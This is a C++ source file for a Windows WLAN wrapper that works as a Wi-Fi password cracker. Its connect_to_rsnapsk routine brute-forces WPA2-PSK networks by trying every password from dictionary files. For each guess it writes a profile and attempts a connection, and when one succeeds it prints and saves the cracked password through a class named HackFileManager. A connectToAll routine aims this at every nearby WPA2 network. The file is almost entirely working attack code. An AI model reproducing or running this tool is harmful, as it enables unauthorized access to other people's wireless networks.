#include "WlanApiWrapper.h"
#include <wlanapi.h>
#include <iostream>
#include <wtypes.h>
#include <codecvt>
#include <algorithm>
#include <vector>

#include "WlanApiErrorWrapper.h"
#include "StringHelper.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")

void WlanApiWrapper::scanEntries()
{
	const auto network_list = getAvailableEntries();

	for (DWORD network_index = 0; network_index < network_list->dwNumberOfItems; network_index++) {
		entries->push_back(network_list->Network[network_index]);
	}
}

void WlanApiWrapper::connectToAll()
{
	ensureEntries();

	std::for_each(std::begin(*entries), std::end(*entries), [this](WLAN_AVAILABLE_NETWORK network_entry) {

		switch (network_entry.dot11DefaultAuthAlgorithm) {
		case DOT11_AUTH_ALGO_80211_OPEN:
			std::cout << "802.11 Open " << network_entry.dot11DefaultAuthAlgorithm << std::endl;
			break;
		case DOT11_AUTH_ALGO_80211_SHARED_KEY:
			std::cout << "802.11 Shared " << network_entry.dot11DefaultAuthAlgorithm << std::endl;
			break;
		case DOT11_AUTH_ALGO_WPA:
			std::cout << "WPA " << network_entry.dot11DefaultAuthAlgorithm << std::endl;
			break;
		case DOT11_AUTH_ALGO_WPA_PSK:
			std::cout << "WPA " << network_entry.dot11DefaultAuthAlgorithm << std::endl;
			break;
		case DOT11_AUTH_ALGO_RSNA_PSK:
			connect_to_rsnapsk(network_entry);
			break;
		default:
			break;
		}
	});
}

void WlanApiWrapper::connect(std::string ssid)
{
	ensureEntries();

	const auto network = std::find_if(std::begin(*entries), std::end(*entries), [ssid](WLAN_AVAILABLE_NETWORK entry) {
		return strcmp(reinterpret_cast<char*>(entry.dot11Ssid.ucSSID), ssid.c_str()) == 0;
	});

	if (network == std::end(*entries)) {
		std::cout << "Cannot find entry " << ssid << "break.";
		return;
	}

	switch ((*network).dot11DefaultAuthAlgorithm) {
	case DOT11_AUTH_ALGO_80211_OPEN:
		std::cout << "802.11 Open " << (*network).dot11DefaultAuthAlgorithm << std::endl;
		break;
	case DOT11_AUTH_ALGO_80211_SHARED_KEY:
		std::cout << "802.11 Shared " << (*network).dot11DefaultAuthAlgorithm << std::endl;
		break;
	case DOT11_AUTH_ALGO_WPA:
		std::cout << "WPA " << (*network).dot11DefaultAuthAlgorithm << std::endl;
		break;
	case DOT11_AUTH_ALGO_WPA_PSK:
		std::cout << "WPA " << (*network).dot11DefaultAuthAlgorithm << std::endl;
		break;
	case DOT11_AUTH_ALGO_RSNA_PSK:
		connect_to_rsnapsk(*network);
		break;
	default:
		break;
	}
}

std::string * WlanApiWrapper::connect_to_rsnapsk(WLAN_AVAILABLE_NETWORK entry)
{
	const std::string authentication = "WPA2PSK";
	const std::string ssid = static_cast<std::string>(reinterpret_cast<char*>(entry.dot11Ssid.ucSSID));

	auto file_paths = pass_manager->getDictionaryFilePaths();

	for (auto path : *file_paths) {
		const auto passwords = pass_manager->getWordsFromDictionary(path);

		for (auto pass : *passwords) {
			auto profile_xml = profile_helper->get_profile_xml(ssid, authentication, "AES", pass);

			//need because setProfile uses prfile_xml in unicode.
			const auto wprofile_xml = StringHelper::convertStringToWString(profile_xml);

			DWORD reasonCode;
			const auto set_profile_result = WlanSetProfile(wlan_client, &wlan_interface_info->InterfaceGuid, 0, (*wprofile_xml).c_str(), nullptr, true, nullptr, &reasonCode);
			
			if (!error_wrapper->wrapSetProfileResult(set_profile_result, reasonCode)) {
				std::cout << "Cannot set profile. Continue trying...";
				continue;
			}

			WLAN_CONNECTION_PARAMETERS params = {};

			/*params.wlanConnectionMode = wlan_connection_mode_discovery_secure;
			params.strProfile = (LPCWSTR)(*wprofile_xml).c_str();
			params.pDot11Ssid = &entry.dot11Ssid;

			params.pDesiredBssidList = 0;
			params.dot11BssType = entry.dot11BssType;
			params.dwFlags = WLAN_CONNECTION_PERSIST_DISCOVERY_PROFILE;*/

			params.wlanConnectionMode = wlan_connection_mode_profile;

			const std::string strProfile((char*)entry.dot11Ssid.ucSSID);
			const auto wStrProfile = StringHelper::convertStringToWString(strProfile);

			params.strProfile = (LPCWSTR)(*wStrProfile).c_str();
			params.pDot11Ssid = &entry.dot11Ssid;

			params.pDesiredBssidList = 0;
			params.dot11BssType = entry.dot11BssType;
			params.dwFlags = 0;

			auto connectResult = WlanConnect(wlan_client, &wlan_interface_info->InterfaceGuid, &params, nullptr);

			//check interface info isState property to connection mode. If connected, so write to file.
			if (!error_wrapper->wrapConnectResult(connectResult))
				continue;

			//update the interface in order to inteligently check 'isState'.
			if (!trySetWlanInterfaceInfo())
			{
				std::cout << "Cannot update wlan interface." << std::endl;
				return nullptr;
			}

			if (wlan_interface_info->isState == wlan_interface_state_connected) {
				std::cout << ssid << " : " << pass << std::endl;
				pass_manager->savePassword(ssid, pass);
				return new std::string(ssid + " " + pass);
			}
		}

		delete passwords;
	}

	delete file_paths;
	return nullptr;
}

bool WlanApiWrapper::trySetWlanClient()
{
	const DWORD dw_max_client = 2;
	DWORD dw_cur_version = 0;

	auto open_handle_result = WlanOpenHandle(dw_max_client, nullptr, &dw_cur_version, &wlan_client);
	const auto isSuccess = error_wrapper->wrapOpenHandleResult(open_handle_result);

	return isSuccess;
}

bool WlanApiWrapper::trySetWlanInterfaceInfo()
{
	PWLAN_INTERFACE_INFO_LIST interfaces_list = nullptr;
	const auto enum_interfaces_result = WlanEnumInterfaces(wlan_client, nullptr, &interfaces_list);

	const auto isSuccess = error_wrapper->wrapEnumInterfacesResult(enum_interfaces_result);

	wlan_interface_info = interfaces_list->InterfaceInfo;
	return isSuccess;
}

PWLAN_AVAILABLE_NETWORK_LIST WlanApiWrapper::getAvailableEntries()
{
	PWLAN_AVAILABLE_NETWORK_LIST network_list = nullptr;
	const auto get_network_list_result = WlanGetAvailableNetworkList(wlan_client, &wlan_interface_info->InterfaceGuid, 0, nullptr, &network_list);

	const auto isSuccess = error_wrapper->wrapGetNetworkListResult(get_network_list_result);

	if (!isSuccess)
		return nullptr;

	return network_list;
}

void WlanApiWrapper::ensureEntries()
{
	if (entries->size() == 0)
		scanEntries();

	//cannot find any wifi entry; exit;
	if (entries->size() == 0)
	{
		std::cout << "There are none of wifi entries. Break.";
		exit(0);
	}
}

WlanApiWrapper::WlanApiWrapper()
{
	entries = new std::vector<WLAN_AVAILABLE_NETWORK>();

	profile_helper = new ProfileHelper();
	error_wrapper = new WlanApiErrorWrapper();
	pass_manager = new HackFileManager();

	const auto init_result = trySetWlanClient();

	if (!init_result)
		exit(1);

	const auto wlan_info = trySetWlanInterfaceInfo();

	if (!wlan_info)
		exit(1);
}

WlanApiWrapper::~WlanApiWrapper()
{
	delete entries;

	delete profile_helper;
	delete error_wrapper;
	delete pass_manager;
}
